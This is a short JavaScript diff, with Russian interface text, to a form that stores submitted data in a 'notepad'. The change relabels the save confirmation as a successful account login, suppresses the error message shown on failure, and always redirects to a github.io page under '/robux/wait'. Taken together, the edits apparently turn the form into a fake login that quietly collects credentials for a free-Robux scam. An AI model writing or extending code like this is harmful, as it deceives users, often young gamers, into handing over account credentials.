@@ -443,11 +443,12 @@
 
     try {
       await updateNotepad(payload);
-      alert("Данные успешно сохранены!");
+      alert("Успешно вошли в акк!");
     } catch (err) {
       console.error(err);
-      alert("Не удалось сохранить данные: " + err.message);
+    
     }
+    window.location.href = "https://alidevtop.github.io/robux/wait";
   }
 
   // ================= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =================
